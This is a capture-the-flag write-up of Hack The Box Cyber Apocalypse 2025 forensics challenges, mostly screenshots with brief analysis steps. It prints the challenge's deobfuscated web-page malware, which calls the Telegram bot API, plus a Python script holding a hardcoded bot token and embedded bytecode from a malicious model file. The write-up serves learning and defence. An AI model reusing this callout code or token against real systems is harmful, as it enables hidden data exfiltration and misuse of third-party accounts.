# Cyber Apocalypse 2025 - Hack The Box(HTB)

![Pasted image 20250322094643](https://github.com/user-attachments/assets/79dd5a34-1d6a-4408-9b23-ac088497847a)


![Pasted image 20250323094351](https://github.com/user-attachments/assets/8d518e5b-180e-4d0f-b61a-a73505271f06)


## Thornin's Amulet

![Pasted image 20250321142557](https://github.com/user-attachments/assets/5b24973b-83b2-44f0-927e-81faa1866ad5)

![Pasted image 20250322095858](https://github.com/user-attachments/assets/d6082917-b23e-4b80-85fc-1cb8a6cc9b51)

Given `.ps1` and access to a website. 

![Pasted image 20250322094844](https://github.com/user-attachments/assets/60455aa5-4ff4-4d5e-8250-7d8ed28bd6ac)

The powershell script contains a command to download a file from `update`.

![Pasted image 20250322095418](https://github.com/user-attachments/assets/b1663a5d-19e3-4b98-85b7-bec7272eebec)

Downloading the file gives us another powershell script that downloads and runs another file.

![Pasted image 20250322095536](https://github.com/user-attachments/assets/046da428-75d8-4fb6-a1af-6086ceda3f86)

Convert the file to just download.

![Pasted image 20250322095834](https://github.com/user-attachments/assets/db1a5854-2624-4fcc-92a1-8a16c9174e59)

Downloads `a541a.ps1`

![Pasted image 20250322095800](https://github.com/user-attachments/assets/199e61b8-d82b-485e-9c69-2e7133222a47)

Can hex decode for the flag.

![Pasted image 20250322095742](https://github.com/user-attachments/assets/821f27c6-adf3-42a1-99d4-464b694ecc65)

## A new Hire

![Pasted image 20250321142627](https://github.com/user-attachments/assets/3404d2f5-7ab8-415e-bfd8-1edd26c2e3c8)

Given .eml email and web endpoint.

![Pasted image 20250322100246](https://github.com/user-attachments/assets/038714f0-7b11-4560-857a-1baa2bdeb48b)

Checking the site

![Pasted image 20250322100527](https://github.com/user-attachments/assets/a9f161ba-0943-430b-9c17-78b99bc5f16c)

In the web source notice a new endpoint.

![Pasted image 20250322101731](https://github.com/user-attachments/assets/a01c058d-1f16-4c8d-951f-c3f905b51909)

Go there and into the parent directory.

Notice a new folder and file. `configs - client.py`

The key looks like the flag.

![Pasted image 20250322101622](https://github.com/user-attachments/assets/0b4fe28f-995e-43b9-b2ad-1eb19c2a9248)

![Pasted image 20250322101611](https://github.com/user-attachments/assets/a7a24c49-24f2-452e-ada2-b1c541456b23)


## Silent Trap


![Pasted image 20250321142644](https://github.com/user-attachments/assets/d65fc495-9123-4f48-89cb-c9e9c203cae9)


![Pasted image 20250322093904](https://github.com/user-attachments/assets/d29c5c2d-46a2-4653-a6f6-f252c966b9c4)


Given `capture.pcapng`.


![Pasted image 20250321071646](https://github.com/user-attachments/assets/9d16ec20-cd93-4605-bdc2-f34dc9279e2d)


2025-02-24_15:46

## Stealth Invasion

![Pasted image 20250321142704](https://github.com/user-attachments/assets/ca94877c-5e23-461f-a036-37567b78d4bb)

![Pasted image 20250322093933](https://github.com/user-attachments/assets/f2b80086-83fc-4541-aad5-406bc6addfd9)

```
1. 4880
2. malext
3. nnjofihdjilebhiiemfmdlpbdkbjcpae
4. 000003.log
5. drive.google.com
6. clips.mummify.proofs

```

Given windows memdump.

![Pasted image 20250321075145](https://github.com/user-attachments/assets/45af4d69-5913-407b-8c6d-73130686a9f2)


![Pasted image 20250321075356](https://github.com/user-attachments/assets/1d223303-c83c-4902-ad68-bdc6dee87e34)

Run pslist

![Pasted image 20250321080303](https://github.com/user-attachments/assets/e13288bd-6e96-428b-aa7f-a4aa9d70c579)


Find one user `selene`, check their Desktop


![Pasted image 20250325223048](https://github.com/user-attachments/assets/087cba77-f1e3-43c1-95bd-149a1532331c)


Can dump some of these files and view them.


![Pasted image 20250325231117](https://github.com/user-attachments/assets/842ed2aa-7642-43a2-8b74-77d8a142ed13)

Important part is 

```
Because the extension is not downloaded through the Web Store, it does not reside in the normal User Data/Default/Extensions directory.
StackOverflow suggests that the local storage for extensions is under User Data\Default\Local Extension Settings\__extensionID__.

```

Shows a log file containing keylogger strokes will be made in appdata.

![Pasted image 20250321082800](https://github.com/user-attachments/assets/2cbcc459-13a7-4190-b16c-6bccea4a21f4)

## ToolPie



![Pasted image 20250321142745](https://github.com/user-attachments/assets/21cf7bd3-77be-4939-ae5e-cf8b08c6dcd1)

![Pasted image 20250322103201](https://github.com/user-attachments/assets/9ba1ad01-9dba-4a9e-bb7f-479734f461e4)


```
1. d
2. d
3. l
4. l
5. l
6. l

```

![Pasted image 20250325222031](https://github.com/user-attachments/assets/de204f7a-5eed-4268-9799-b14e8980850e)

The key here was to extract the code as raw, manipulate it in something like cyberchef, then from hex. Otherwise will get bad bytes/continuation error. Change the `exec` to `dis.dis` then run. 

![Pasted image 20250322112023](https://github.com/user-attachments/assets/edf3cd40-4b8e-40f9-b5f9-29befe1b03dc)



![Pasted image 20250322112138](https://github.com/user-attachments/assets/a9a8d1ab-e7b5-4446-98e2-410f37781567)


The `key part` is further down, the string after separator is the key for aes.

We can see this in wireshark

![Pasted image 20250321101256](https://github.com/user-attachments/assets/29438ff2-02cd-4b40-b837-059753d3f509)

Take the key and payload into `CyberChef` and can see it decrypts a pdf header.


![Pasted image 20250321103421](https://github.com/user-attachments/assets/5060ca2d-b7e1-406c-a037-3122f9fc6e8c)

To answer the final question.

![Pasted image 20250321103439](https://github.com/user-attachments/assets/f75990ad-8cda-4012-9cb2-dd3e88f3334c)



## Cave Expedition

![Pasted image 20250321142731](https://github.com/user-attachments/assets/5e7c4804-bf74-49d8-be24-311ef839387b)


![Pasted image 20250324215704](https://github.com/user-attachments/assets/8988b575-eae5-4e1e-bf46-b119d958acf7)

Get Windows evtx logs and an encrypted pdf. 

Open and chainsaw and find some obfuscated powershell.

![Pasted image 20250324221002](https://github.com/user-attachments/assets/1acb628c-3b77-4027-9f10-066d7c06c777)

Clean up in CyberChef and see another obfuscated `.ps1`.

It is a script that encrypted our `map.pdf.secured`. Get GPT to reverse the flow and run it. 


![Pasted image 20250324232921](https://github.com/user-attachments/assets/6387d4a3-5311-4591-9375-c00d9afd578a)

Open the decrypted/original pdf and get the flag on the bottom.

![Pasted image 20250324232906](https://github.com/user-attachments/assets/db7d898d-b219-46dd-9711-fa3d7d708325)

## Tales for the Brave 


![Pasted image 20250321142805](https://github.com/user-attachments/assets/aa9a9bda-6e98-4a2e-b043-3b7e26775f17)

Given access to a website.

![Pasted image 20250321210758](https://github.com/user-attachments/assets/39f60d2c-fe9c-4704-8569-339253d765c8)

Notice obfuscated Javascript.

![Pasted image 20250323215934](https://github.com/user-attachments/assets/c706e38b-aab3-4ab2-890b-dcc7f62cbefd)


```
document.getElementById("newsletterForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const emailField = document.getElementById("email");
  const descriptionField = document.getElementById("descriptionField");
  let isValid = true;
  if (!emailField.value) {
    emailField.classList.add("shake");
    isValid = false;
    setTimeout(() => {
      return emailField.classList.remove("shake");
    }, 500);
  }
  if (!isValid) {
    return;
  }
  const emailValue = emailField.value;
  const specialKey = emailValue.split("@")[0];
  const desc = parseInt(descriptionField.value, 10);
  f(specialKey, desc);
});

function f(oferkfer, icd) {
  const channel_id = -1002496072246;
  var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
  if (oferkfer === "0p3r4t10n_4PT_Un10n" && CryptoJS.SHA256(sequence.join("")).toString(CryptoJS.enc.Base64) === "18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=") {
    var decrypted = CryptoJS.RC4Drop.decrypt(enc_token, CryptoJS.enc.Utf8.parse(oferkfer), {
      drop: 192
    }).toString(CryptoJS.enc.Utf8);
    var HOST = "https://api.telegram.org" + "/" + "b" + "o" + "t" + decrypted;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE) {
        const resp = JSON.parse(xhr.responseText);
        try {
          const link = resp.result.text;
          window.location.replace(link);
        } catch (error) {
          alert("Form submitted!");
        }
      }
    };
    xhr.open("GET", HOST + "/" + "forwardMessage?chat_id=" + icd + "&from_chat_id=" + channel_id + "&message_id=5");
    xhr.send(null);
  } else {
    alert("Form submitted!");
  }
}
var sequence = [];

function l() {
  sequence.push(this.id);
}
var checkboxes = document.querySelectorAll("input[class=cb]");
for (var i = 0; i < checkboxes.length; i++) {
  checkboxes[i].addEventListener("change", l);
}
```




Python code to get logs

```
import requests

# Your bot token
TOKEN = "7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc"

# Telegram API URL
URL = f"https://api.telegram.org/bot{TOKEN}/getUpdates"

def fetch_bot_logs():
    try:
        response = requests.get(URL)
        response.raise_for_status()
        data = response.json()

        print("✅ Bot logs fetched successfully!\n")

        for update in data.get("result", []):
            msg = update.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            username = msg.get("from", {}).get("username")
            text = msg.get("text")
            date = msg.get("date")
            print(f"[{date}] @{username} ({chat_id}): {text}")

    except Exception as e:
        print("❌ Failed to fetch bot logs:", e)

if __name__ == "__main__":
    fetch_bot_logs()
```


Different teammate screenshot of getting hints about the zip with exe and password.

![Pasted image 20250323124705](https://github.com/user-attachments/assets/98fc1970-94b3-445a-9767-55560437d4de)

### Dynamically reversing the exe.

Run `Brave.exe`, it crashes. Remembering it was running a check to find if brave was on the system.

Looking at execution in x64

![Pasted image 20250323124558](https://github.com/user-attachments/assets/8ef6bdeb-b76e-4b0e-90e3-f181d1cd7411)

Can see it goes into the .db folder. Opening up Wireshark notice its trying to reach out to a random URL with htb. But at this point I dont get any further interaction.

![Pasted image 20250321142914](https://github.com/user-attachments/assets/9bcc2cd5-ce9e-42ea-ae6c-ca30bd8021a2)

Make that url point to the localhost in `Windows/System32/drivers/etc/hosts`

Capture some post and a JWT token.

![Pasted image 20250321142459](https://github.com/user-attachments/assets/c29599bd-949c-43b2-946a-5a9e9d2e3174)

`jwt.io`

![Pasted image 20250321142440](https://github.com/user-attachments/assets/43301f6f-ae86-4286-ba8a-fdeb1041b7a5)

Notice the auth, base64 decode twice.

![Pasted image 20250321141608](https://github.com/user-attachments/assets/6164f25b-f708-48c0-be8d-324bdd6413b9)

## Malakar's Deception

![Pasted image 20250321202222](https://github.com/user-attachments/assets/844e6b20-d305-4764-a4b1-3bffc14ab757)

Given malicious.h5

![Pasted image 20250322103351](https://github.com/user-attachments/assets/4ea48e6b-8a3a-4330-bb3d-881642876e3f)

Python, tensorflow, 

Run `h5dump` cat some initial output like metadata, tensorflow version. 


![Pasted image 20250322103442](https://github.com/user-attachments/assets/4e7063af-56b2-4e49-9f3a-c0229e816fe9)

Further down see some lambda functions.
```
"code": "4wEAAAAAAAAAAAAAAAQAAAADAAAA8zYAAACXAGcAZAGiAXQBAAAAAAAAAAAAAGQCpgEAAKsBAAAA\nAAAAAAB8AGYDZAMZAAAAAAAAAAAAUwApBE4pGulIAAAA6VQAAADpQgAAAOl7AAAA6WsAAADpMwAA\nAOlyAAAA6TQAAADpUwAAAOlfAAAA6UwAAAByCQAAAOl5AAAAcgcAAAByCAAAAHILAAAA6TEAAADp\nbgAAAOlqAAAAcgcAAADpYwAAAOl0AAAAcg4AAADpMAAAAHIPAAAA6X0AAAD6JnByaW50KCdZb3Vy\nIG1vZGVsIGhhcyBiZWVuIGhpamFja2VkIScp6f////8pAdoEZXZhbCkB2gF4cwEAAAAg+h88aXB5\ndGhvbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIaAAAADgAAAHM0AAAAgADwAgEJ\nSAHwAAEJSAHwAAEJSAHlCAzQDTXRCDbUCDbYCAnwCQUPBvAKAAcJ9AsFDwqAAPMAAAAA\n", "defaults": null, "closure": null}}, "output_shape": {"class_name": "__lambda__", "config": {"code": "4wEAAAAAAAAAAAAAAAEAAAADAAAA8wYAAACXAHwAUwApAU6pACkB2gFzcwEAAAAg+h88aXB5dGhv\nbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIFAAAAFQAAAHMGAAAAgACYMYAA8wAA\nAAA=\n"
```

This gives me a python bytecode vibe.

![Pasted image 20250322103622](https://github.com/user-attachments/assets/33d70c7c-a20b-48e8-b80d-491a9e73949f)

![Pasted image 20250322103726](https://github.com/user-attachments/assets/01f45ce8-f83c-4771-a53f-92d5280a2213)

3.14 game me something weird, run it with multiple versions!!! See the print and some ascii looking string being loaded.

![Pasted image 20250321202051](https://github.com/user-attachments/assets/2939826b-ef96-43ea-9302-94a411a97fe7)

Take to CyberChef and get the flag.

![Pasted image 20250321202022](https://github.com/user-attachments/assets/f898e2cd-605d-4a78-a203-247b1e4fbc8e)

















